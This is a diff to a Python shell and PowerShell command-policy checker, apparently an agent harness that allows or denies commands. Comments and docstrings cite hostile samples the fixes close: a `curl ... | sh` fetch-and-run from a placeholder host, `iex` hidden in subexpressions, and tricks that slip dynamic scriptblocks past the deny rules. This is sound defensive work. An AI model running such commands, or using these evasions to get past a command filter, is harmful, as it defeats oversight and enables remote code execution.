@@ -49,9 +49,12 @@ _CWD_REFERENCE = re.compile(
 _LITERAL_COMMA = "__HARNESS_LITERAL_COMMA_8F3A__"
 _LITERAL_OPEN_BRACE = "__HARNESS_LITERAL_OPEN_BRACE_2D91__"
 _LITERAL_CLOSE_BRACE = "__HARNESS_LITERAL_CLOSE_BRACE_2D91__"
+_LITERAL_BACKTICK = "__HARNESS_LITERAL_BACKTICK_2D91__"
 _INERT_QUOTED_PREFIX = "__HARNESS_INERT_QUOTED_31C7_"
 _INVALID_INERT_QUOTED = "__HARNESS_INVALID_INERT_QUOTED__"
 _QUOTED_GROUP_LITERAL_PREFIX = "__HARNESS_QUOTED_GROUP_LITERAL__"
+_SEGMENT_SEPARATOR_PREFIX = "__HARNESS_SEGMENT_SEPARATOR_"
+_SEGMENT_SEPARATOR_SUFFIX = "__"
 
 
 def restore_quoted_literal_markers(value: str) -> str:
@@ -60,7 +63,44 @@ def restore_quoted_literal_markers(value: str) -> str:
         value.replace(_LITERAL_COMMA, ",")
         .replace(_LITERAL_OPEN_BRACE, "{")
         .replace(_LITERAL_CLOSE_BRACE, "}")
+        .replace(_LITERAL_BACKTICK, "`")
     )
+
+
+def segment_separator_token(operator: str) -> str:
+    """Encode a segmentation operator as an inert argv token.
+
+    An argv rejoin has to carry the separator that segmentation consumed, but a
+    bare `|` token is indistinguishable from a `|` that arrived as quoted DATA
+    (`Write-Host '|'`), and re-emitting THAT one as an operator would let quoted
+    text trip a rule. Carrying the fact inside a token instead of beside it also
+    avoids the positional-parallel-list desynchronization that every rewrite
+    between tokenization and use (`strip_control_prefixes`, the compact `rd/del`
+    expansion, `command_head`'s glued-`%{` split, alias expansion) causes.
+
+    Hex so the token holds only `[A-Z0-9_]`: it must stay inert for the brace
+    scanner, the dynamic-token test and every prefix match in between.
+    """
+    return (
+        _SEGMENT_SEPARATOR_PREFIX
+        + operator.encode("utf-8").hex().upper()
+        + _SEGMENT_SEPARATOR_SUFFIX
+    )
+
+
+def segment_separator_operator(token: str) -> str | None:
+    """Decode a synthesized separator token; None means it is not one."""
+    if not token.startswith(_SEGMENT_SEPARATOR_PREFIX) or not token.endswith(
+        _SEGMENT_SEPARATOR_SUFFIX
+    ):
+        return None
+    encoded = token[
+        len(_SEGMENT_SEPARATOR_PREFIX) : len(token) - len(_SEGMENT_SEPARATOR_SUFFIX)
+    ]
+    try:
+        return bytes.fromhex(encoded).decode("utf-8")
+    except (ValueError, UnicodeDecodeError):
+        return None
 
 
 def has_shell_expansion_marker(value: str) -> bool:
@@ -335,7 +375,11 @@ def has_dynamic_shell_token(token: str) -> bool:
     lowered = token.lower()
     if lowered.endswith(":$false") or lowered.endswith(":$true"):
         return False
-    return bool(re.search(r"\$|%[^%]+%|![^!]+!|`", token))
+    # `_LITERAL_BACKTICK` is a quote-masked backtick. Without the second test the
+    # mask would HIDE a quoted backtick from this check -- a silent relaxation.
+    return bool(re.search(r"\$|%[^%]+%|![^!]+!|`", token)) or (
+        _LITERAL_BACKTICK in token
+    )
 
 
 def powershell_start_process_command(toks: list[str]) -> tuple[str | None, str]:
@@ -693,24 +737,42 @@ def token_holds_restored_quote(token: str) -> bool:
             _LITERAL_OPEN_BRACE,
             _LITERAL_CLOSE_BRACE,
             _LITERAL_COMMA,
+            _LITERAL_BACKTICK,
             _QUOTED_GROUP_LITERAL_PREFIX,
         )
     )
 
 
 def powershell_block_depth(token: str) -> int:
-    """Net `{`/`}` depth of a token.
+    """Net `{`/`}` depth of a token, honouring PowerShell backtick escapes.
 
-    Braces are counted plainly, INCLUDING backtick-escaped ones. PowerShell does
-    treat `` `{ `` as a literal character, but a quote-aware token has already had
-    its quoted spans substituted back in (see quote_aware_segments_with_operators),
-    so a backtick here may be literal data rather than an escape. Honouring it as
-    an escape would let `{'``'}` swallow its own closing brace and hide whatever
-    followed the block. Miscounting toward "still open" only ever costs a
-    truncated read, whose body is inspected anyway; miscounting toward "closed"
-    would drop tokens unexamined.
+    A backtick escapes the next character, so `` a`{b `` is the literal text
+    "a{b" and contributes nothing to the depth. A backtick that arrived as
+    quoted DATA is masked as `_LITERAL_BACKTICK` by
+    quote_aware_segments_with_operators, so every bare backtick left in a
+    quote-aware token really is an escape character -- that is what makes
+    honouring it safe, and it is why `` {'`'} `` still balances.
+
+    Counting an escaped brace plainly is NOT the conservative choice. Reading
+    the block as still open makes it swallow the real `}` and re-classify the
+    cmdlet's trailing arguments as inert body text: in
+    `` ForEach-Object { Write-Host a`{b } $sb `` that demoted `$sb` from a
+    dynamic -RemainingScripts scriptblock (deny) to a Write-Host argument
+    (allow). Neither direction is safe; only the correct count is.
     """
-    return token.count("{") - token.count("}")
+    depth = 0
+    index = 0
+    while index < len(token):
+        char = token[index]
+        if char == "`":
+            index += 2  # the escaped character is literal, whatever it is
+            continue
+        if char == "{":
+            depth += 1
+        elif char == "}":
+            depth -= 1
+        index += 1
+    return depth
 
 
 def scan_powershell_literal_block(
@@ -773,7 +835,9 @@ def is_powershell_foreach_loop_statement(head: str, toks: list[str]) -> bool:
 
 
 def complete_scriptblock_argv(
-    toks: list[str], following: list[list[str]]
+    toks: list[str],
+    following: list[tuple[list[str], str]],
+    operator_after: str = "",
 ) -> tuple[list[str], bool]:
     """Rejoin an argv whose literal scriptblock was cut by segment splitting.
 
@@ -787,16 +851,31 @@ def complete_scriptblock_argv(
     dropped as an inert control token. Rejoining while the block stays open
     keeps them inspectable, so `ForEach-Object { $_ ; } -MemberName Delete`
     cannot launder its member invocation through the split.
+
+    The separator segmentation consumed is part of the block's program text and
+    is re-inserted with the tokens it separated. Dropping it rebuilt
+    `{ curl -q https://x | sh }` as the argv `curl -q https://x sh`, in which
+    `sh` is a curl argument and the pipe-to-shell rule has nothing to fire on;
+    it also glued a body's statements into one, so every statement after the
+    first became unreachable to body inspection. The separator is synthesized
+    from segmentation metadata into a marker token, never lifted from token
+    text, so restored quoted data can never forge one.
     """
     joined, opaque = split_segment_comment(toks)
     depth = sum(powershell_block_depth(token) for token in joined)
     if depth <= 0:
         return joined, opaque
-    for segment in following:
+    pending = operator_after
+    for segment, segment_operator in following:
         kept, hid = split_segment_comment(segment)
         opaque = opaque or hid
+        if pending and kept:
+            # A segment consumed entirely by a comment tail contributes no
+            # separator, so no doubled operator appears.
+            joined.append(segment_separator_token(pending))
         joined.extend(kept)
         depth += sum(powershell_block_depth(token) for token in kept)
+        pending = segment_operator
         if depth <= 0:
             break
     return joined, opaque
@@ -816,6 +895,75 @@ def resolve_powershell_parameter(
     if len(matches) != 1:
         return None, None, bool(separator)
     return matches[0], attached if separator else None, bool(separator)
+
+
+# PowerShell BINARY/UNARY OPERATORS (about_Operators). These look like cmdlet
+# parameters and are not: `(1 | % { $_.n }) -join ', '` applies `-join` to the
+# parenthesized pipeline's RESULT, so the cmdlet's argument list ended at the
+# `)`. Reading one as an unrecognized parameter denied everyday PowerShell.
+# Comparison operators also have explicit-case spellings (`-ceq`, `-ilike`),
+# handled by the `c`/`i` prefix walk in `powershell_expression_operator`.
+_POWERSHELL_COMPARISON_OPERATORS = frozenset(
+    {
+        "contains",
+        "eq",
+        "ge",
+        "gt",
+        "in",
+        "le",
+        "like",
+        "lt",
+        "match",
+        "ne",
+        "notcontains",
+        "notin",
+        "notlike",
+        "notmatch",
+        "replace",
+        "split",
+    }
+)
+_POWERSHELL_PLAIN_OPERATORS = frozenset(
+    {
+        "and",
+        "as",
+        "band",
+        "bnot",
+        "bor",
+        "bxor",
+        "f",
+        "is",
+        "isnot",
+        "join",
+        "not",
+        "or",
+        "shl",
+        "shr",
+        "xor",
+    }
+)
+
+
+def powershell_expression_operator(token: str) -> bool:
+    """Whether this `-word` token is a PowerShell operator, not a parameter.
+
+    An operator ENDS the cmdlet's argument list: everything after it is operand
+    text of the surrounding expression, which this scanner has no basis to
+    classify. Only exact operator names match — an unknown `-parameter` still
+    fails closed, so this narrows a false positive without opening a blind spot.
+    """
+    if not token.startswith("-") or token.startswith("--"):
+        return False
+    name = token[1:].lower()
+    if not name:
+        return False
+    if name in _POWERSHELL_PLAIN_OPERATORS:
+        return True
+    # `-ceq` / `-ieq` are the case-sensitive and case-insensitive spellings of
+    # the same comparison operator.
+    if name[0] in {"c", "i"} and name[1:] in _POWERSHELL_COMPARISON_OPERATORS:
+        return True
+    return name in _POWERSHELL_COMPARISON_OPERATORS
 
 
 def powershell_invoke_command_opacity(toks: list[str]) -> str | None:
@@ -948,6 +1096,11 @@ def powershell_pipeline_scriptblock_opacity(head: str, toks: list[str]) -> str |
         script_parameters | member_parameters | value_parameters | switch_parameters
     )
     index = 1
+    # Set once a PowerShell binary operator is seen: from there on the tokens are
+    # operands of the surrounding EXPRESSION, not cmdlet arguments, so neither the
+    # unknown-parameter nor the member-invocation reading applies to them. The
+    # dynamic-payload checks below still run — an `iex` can hide in `(...)`.
+    expression_tail = False
     while index < len(toks):
         token = toks[index]
         if token.startswith("@"):
@@ -957,6 +1110,13 @@ def powershell_pipeline_scriptblock_opacity(head: str, toks: list[str]) -> str |
                 token, parameter_names
             )
             if name is None:
+                if powershell_expression_operator(token):
+                    # `(1 | % { $_.n }) -join ', '`: the cmdlet's argument list
+                    # ended at the `)`. Only exact operator names match, so an
+                    # unknown parameter still fails closed below.
+                    expression_tail = True
+                    index += 1
+                    continue
                 if foreach:
                     return "A pipeline cmdlet parameter cannot be inspected safely."
                 index += 1  # Where-Object comparison operators are inert
@@ -988,9 +1148,15 @@ def powershell_pipeline_scriptblock_opacity(head: str, toks: list[str]) -> str |
             index = next_index
             continue
         # A `(...)`/`@(...)` subexpression (e.g. [scriptblock]::Create(...))
-        # builds a scriptblock at runtime whose body the floor never sees.
+        # builds a scriptblock at runtime whose body the floor never sees. This
+        # stays live in an expression tail: `-join (iex '...')` still executes.
         if token.startswith(("(", "@(")):
             return "A dynamic pipeline scriptblock cannot be inspected safely."
+        if expression_tail:
+            # An operator's operand is a value, not a scriptblock source: `-join
+            # $separator` stringifies `$separator`, it does not invoke it.
+            index += 1
+            continue
         if has_dynamic_shell_token(token):
             return "A dynamic pipeline scriptblock cannot be inspected safely."
         if foreach:
@@ -1020,6 +1186,12 @@ def requote_argv_token(token: str) -> str:
     """
     if not token:
         return "''"
+    separator = segment_separator_operator(token)
+    if separator is not None:
+        # Synthesized by the rejoin from segmentation metadata, so it really is
+        # program structure and must be emitted bare. A `|` that came from a
+        # quoted span is an ordinary token and stays quoted below.
+        return separator
     if not _ARGV_TOKEN_NEEDS_QUOTING.search(token):
         return token
     return "'" + token.replace("'", "'\"'\"'") + "'"
@@ -2196,6 +2368,10 @@ def quote_aware_segments_with_operators(command: str) -> list[tuple[list[str], s
             value.replace(",", _LITERAL_COMMA)
             .replace("{", _LITERAL_OPEN_BRACE)
             .replace("}", _LITERAL_CLOSE_BRACE)
+            # A backtick that came out of a quoted span is DATA. Masking it is
+            # what lets powershell_block_depth honour the remaining bare
+            # backticks as the escape characters they provably are.
+            .replace("`", _LITERAL_BACKTICK)
         )
         quoted[placeholder] = value
         return placeholder
@@ -6466,9 +6642,13 @@ def check(
     # follow it within the same pass; complete_scriptblock_argv walks these so a
     # cmdlet's post-`}` arguments stay inspectable. Sliced on demand rather than
     # precomputed per index, so a command with many segments stays linear.
-    pass_order: dict[int, list[list[str]]] = {}
+    # Each entry carries the operator that ENDED its segment: that separator is
+    # part of the block's program text and complete_scriptblock_argv re-inserts
+    # it, so `{ curl ... | sh }` and `{ a; b }` are rebuilt as the programs they
+    # are rather than as one flat argument list.
+    pass_order: dict[int, list[tuple[list[str], str]]] = {}
     for raw_toks, _aware, _text, _operator, seg_pass, _index in execution_segments:
-        pass_order.setdefault(seg_pass, []).append(raw_toks)
+        pass_order.setdefault(seg_pass, []).append((raw_toks, _operator))
     initial_cwd = command_cwd
     current_cwd = command_cwd
     cwd_uncertain = _cwd_uncertain
@@ -6812,7 +6992,9 @@ def check(
             if not quote_aware:
                 continue
             complete_argv, argv_opaque = complete_scriptblock_argv(
-                toks, pass_order.get(current_pass, [])[segment_index + 1 :]
+                toks,
+                pass_order.get(current_pass, [])[segment_index + 1 :],
+                operator_after,
             )
             if argv_opaque:
                 return "deny", _SCRIPTBLOCK_COMMENT_REASON
@@ -6830,7 +7012,9 @@ def check(
                 complete_argv, argv_opaque = toks, False
             else:
                 complete_argv, argv_opaque = complete_scriptblock_argv(
-                    toks, pass_order.get(current_pass, [])[segment_index + 1 :]
+                    toks,
+                    pass_order.get(current_pass, [])[segment_index + 1 :],
+                    operator_after,
                 )
             if argv_opaque:
                 return "deny", _SCRIPTBLOCK_COMMENT_REASON
